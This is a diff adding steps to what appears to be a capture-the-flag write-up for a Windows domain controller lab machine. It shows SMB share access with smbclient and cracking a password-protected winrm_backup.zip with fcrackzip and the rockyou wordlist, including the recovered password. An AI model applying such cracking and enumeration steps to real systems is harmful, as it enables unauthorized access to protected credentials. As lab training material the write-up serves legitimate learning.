@@ -106,6 +106,8 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
         SYSVOL          Disk      Logon server share 
    ```
 
+  Ivestiating we find several files on Shares share:
+
    ```sh
    smbclient \\\\10.10.11.152\\Shares
    ```
@@ -117,8 +119,18 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
    ```
 
-
-
+  winrm_backup seems interesting but its password protected.
+  DOCX Files contain documentation about how passwords are managed arround the directory.
+  
+  lets try to crack the zip
+   ```sh
+   fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
+   ```
+   ```sh
+   PASSWORD FOUND!!!!: pw == supremelegacy
+   ```
+   Zip password was weak: supremelegacy
+   
 
 
 
